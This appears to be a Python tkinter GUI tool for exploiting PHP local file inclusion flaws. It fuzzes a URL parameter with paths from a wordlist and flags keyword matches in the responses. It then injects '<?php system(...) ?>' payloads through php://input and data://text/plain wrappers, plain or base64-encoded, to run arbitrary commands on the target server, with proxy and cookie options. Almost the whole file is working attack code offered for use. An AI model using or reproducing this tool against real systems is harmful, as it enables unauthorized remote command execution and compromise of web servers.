import requests
import tkinter
import os
from tkinter import *
import threading
from bs4 import BeautifulSoup
import time
import base64
import re

http=''
https=''
ca1=0

cook1=''
cook2=''
cook3 = ''
def wjbh():
    qingchu()
    ca=0
    global ca1,https,http,cook1,cook2,cook3
    proxies = {'http': http, 'https': https}
    header = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"}
    if cook1!='':
        header[cook1]=cook2.replace(' ','')
    elif cook1=='a':
        del header[cook3]
        cook3=''
    else:
        ca31.insert(tkinter.END, '[-]cookie为空\n')
        ca31.update()
    cd=open(os.getcwd()+'\\wjbh.txt','r',encoding='utf-8')
    while True:
        if ca==0 and ca1==0:
            ag = cd.readline().replace("\n", "")
            try:
                if len(ag) != 0:
                    if var.get() == 'file://':
                        url = ca6.get() + "file://{}".format(ag)  # 文件包含file://
                    else:
                        url = ca6.get() + "{}".format(ag)
                    cg = "请求：" + url
                    ca31.insert(tkinter.END, cg + '\n')
                    ca31.update()
                    a = requests.get(str(url),headers=header,proxies=proxies,verify=False,timeout=5)
                    a.encoding = "utf-8"
                    b = BeautifulSoup(a.text, "lxml")
                    ain = open(os.getcwd() + '\\sx.txt', 'r', encoding='utf-8')
                    while True:
                        jn = ain.readline().replace("\n", "")
                        if len(jn) != 0:
                            if jn in str(b):
                                un = "[+]匹配到关键词：" + jn
                                ca31.insert(tkinter.END, un+'\n')
                                ca31.update()
                                ca += 1
                                break
                        else:
                            break
                    time.sleep(2)
                    if ca == 0:
                        un = "[-]未匹配到关键词"
                        ca31.insert(tkinter.END, un + '\n')
                        ca31.update()
            except EnvironmentError as e:
                ca31.insert(tkinter.END, '[-]请求错误\n')
                ca31.update()
        else:
            ca *= 0
            ca1*=0
            ca31.insert(tkinter.END, '[-]已停止检测\n')
            ca31.update()
            break
def cmmd1():
    asa1=threading.Thread(target=wjbh,args=())
    asa1.start()
def wjbh1():
    global http,https,cook1,cook2,cook3#设置代理
    header = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"}
    if cook1 != '':
        header[cook1] = cook2.replace(' ','')
    elif cook1 == 'a':
        del header[cook3]
        cook3 = ''
    else:
        ca31.insert(tkinter.END, '[-]cookie为空\n')
        ca31.update()
    proxies = {'http': http, 'https': https}
    qingchu()
    if var.get() == 'php://input':
        url = ca6.get() + "php://input"  # 文件包含：php://input执行命令
        data = "<?php system('{}'); ?>".format(str(ca61.get()))
        a = requests.post(url, data=data,headers=header,proxies=proxies,verify=False,timeout=5)
        a.encoding = "utf-8"
        ca31.insert(tkinter.END, a.text + '\n')
        ca31.update()
    elif var.get() == 'data://text/plain':
        url = ca6.get() + "data://text/plain,<?php system('{}');?>".format(str(ca61.get()))  # 文件包含：php://filter/ 协议读取php代码
        a = requests.get(url,proxies=proxies,headers=header,verify=False,timeout=5)
        a.encoding = "utf-8"
        ca31.insert(tkinter.END, a.text + '\n')
        ca31.update()
    elif var.get() == 'data://text/plain;base64':
        ca='<?php system('+ca61.get()+');?>'
        encodestr = base64.b64encode(ca.encode('utf-8'))
        c3 = str(encodestr, 'utf-8')
        url = ca6.get() + "data://text/plain;base64,"+c3 # 文件包含：php://filter/ 协议读取php代码
        a = requests.get(url,proxies=proxies,headers=header,verify=False,timeout=5)
        a.encoding = "utf-8"
        ca31.insert(tkinter.END, a.text + '\n')
        ca31.update()
    elif var.get() == '自定义内容(input)':
        try:
            url = ca6.get() + "php://input"  # 文件包含：php://input执行命令
            data = "{}".format(str(ca61.get()))
            a = requests.post(url, data=data, headers=header, proxies=proxies, verify=False, timeout=5)
            a.encoding = "utf-8"
            ca31.insert(tkinter.END, a.text + '\n')
            ca31.update()
        except:
            ca31.insert(tkinter.END,"[-]请求错误" + '\n')
            ca31.update()
    else:
        ca31.insert(tkinter.END, "未选择协议" + '\n')
        ca31.update()
def cmmd2():
    asa1=threading.Thread(target=wjbh1,args=())
    asa1.start()
def qingchu():
    ca31.delete('1.0', 'end')
def qingchu1():
    asa1=threading.Thread(target=qingchu,args=())
    asa1.start()
def cnbadj():
    global ca1
    ca1+=1
def isym():
    asa1=threading.Thread(target=cnbadj,args=())
    asa1.start()
def qt():
    child = tkinter.Toplevel()
    # img = PhotoImage(file=uo + '\\log\\1.ico')  # 调用ico图片
    # child.tk.call('wm', 'iconphoto', child._w, img)  # 替换原有ico
    child.title('  其他设置  ')
    child.geometry('600x500')
    frr = Frame(child, relief=RAISED, borderwidth=1)  # 创建窗体
    frr.pack(side=TOP, fill=BOTH, ipadx=10, ipady=5, expand=0)  # 窗体设置
    frr1 = Frame(child, relief=RAISED, borderwidth=1)  # 创建窗体
    frr1.pack(side=TOP, fill=BOTH, ipadx=10, ipady=5, expand=0)  # 窗体设置
    #
    cab1 = tkinter.Entry(frr, text='', width=30)
    cab1.insert(0, 'http://x.x.x.x:xx')
    cab1.pack(side=LEFT, padx=5, pady=0)
    def admin():  # 代理设置
        global http,https
        if 'http' in cab1.get():
            http=cab1.get()
            https= cab1.get()
        elif cab1.get()=='':
            http = ''
            https = ''
            ca31.insert(tkinter.END, '[!]代理已关闭\n')
            ca31.update()
        else:
            ca31.insert(tkinter.END, '[-]代理格式错误\n')
            ca31.update()
    # -------------------------------------------
    btnup = Button(frr, text="       代理       ", fg='green', command=admin)
    btnup.pack(side='left')
    #
    cab = tkinter.Entry(frr1, text='', width=30)
    cab.insert(0, '')
    cab.pack(side=LEFT, padx=5, pady=0)
    def coo():  # 代理设置
        global cook1,cook2,cook3
        if cab.get()!='a':
            try:
                al = re.match('(.*?):(.*)', str(cab.get()))
                cook1 = al.group(1)
                cook2 = al.group(2)
                cook3 = cook1
            except:
                pass
        else:
            cook1 = ''
            cook2 = ''
    # -------------------------------------------
    btnup = Button(frr1, text="  cookie设置  ", fg='green',command=coo)
    btnup.pack(side='left')
    # -------------------------------------------
def cmmd():
    asa1=threading.Thread(target=qt,args=())
    asa1.start()
#------------------------------
root = tkinter.Tk()
uo = os.getcwd()
root.title('T-文件包含漏洞利用(GET)')#主体名称
root.geometry('700x680')  # 主体大小
fr = Frame(root, relief=RAISED, borderwidth=1)  # 创建窗体
fr.pack(side=TOP, fill=BOTH, ipadx=10, ipady=10, expand=0)  # 窗体设置
fr1 = Frame(root, relief=RAISED, borderwidth=1)  # 创建窗体
fr1.pack(side=TOP, fill=BOTH, ipadx=10, ipady=5, expand=0)  # 窗体设置
#img = PhotoImage(file=uo + '\\log\\1.ico')#调用ico图片
#root.tk.call('wm', 'iconphoto',root._w, img)#替换原有ico
#------------------------------------------------------------漏洞检测
ca6 = tkinter.Entry(fr, text='',width=30)
ca6.insert(0,'http://127.0.0.1:81/3.php?filepath=')
ca6.pack(side=LEFT, padx=5, pady=0)
btnup1 = Button(fr, text="    漏洞检测    ",fg='green',command=cmmd1)
btnup1.pack(side=LEFT, padx=5, pady=0)
#-----------------------------------------------------------协议选择
kl1=("无协议","file://")
var = tkinter.StringVar()
var.set("   无协议")
btnu=tkinter.OptionMenu(fr,var,*kl1)
btnu.pack(side=LEFT, padx=5, pady=0)
#-----------------------------------------------------------停止检测
btnup1 = Button(fr,text="    停止检测    ",fg='red',command=isym)
btnup1.pack(side=LEFT, padx=5, pady=0)

# -----------------------------------------------------------命令执行
ca61 = tkinter.Entry(fr1, text='',width=30)
ca61.insert(0,'whoami')
ca61.pack(side=LEFT, padx=5, pady=0)

btnup1 = Button(fr1, text="        命令执行        ",fg='green',command=cmmd2)
btnup1.pack(side=LEFT, padx=5, pady=0)
kl1=("php://input","data://text/plain","data://text/plain;base64","自定义内容(input)")
var = tkinter.StringVar()
var.set("协议选择")
btnu=tkinter.OptionMenu(fr1,var,*kl1)
btnu.pack(side=LEFT, padx=5, pady=0)
btnup1 = Button(fr1,text="    其他设置    ",command=cmmd)
btnup1.pack(side=LEFT, padx=5, pady=0)
# -----------------------------------------------------------漏洞检测
scroll1 = tkinter.Scrollbar(root,width=20)  # 创建滚轮
# 放到窗口的右侧, 填充Y竖直方向
scroll1.pack(side=tkinter.RIGHT, fill=tkinter.Y)
ca31 = tkinter.Text(root, width=500, height=45,yscrollcommand=scroll1.set)
ca31.pack(side=LEFT)
ca31.insert(tkinter.END,"\n使用方法：\n"
                        "\n1.漏洞检测格式:https://地址:端口/。\n\n"
                        "2.代理格式:http://地址:端口。\n\n"
                        "3.Cookie格式:'Cookie: security=icascne; PHPSESSID=1d0pdvk4q131cavgsicd13vopj4n55'。\n\n"
                        "4.删除代理地址单击代理按钮可以关闭代理。\n\n"
                        "5.命令执行前请选择协议，上传代码或执行其他代码请选择自定义\n\n"
                        "6.清楚内容后输入 a 可取消使用cookie\n\n"
                        "7.字典位置(可自定义内容)：TZ\wjbh.txt\n\n"
                        "8.特征值位置(可自定义内容)：TZ\sx.txt\n\n"
                        "9.POST版后续补充......\n\n")
scroll1.config(command=ca31.yview)
root.resizable(False, False)
root.mainloop()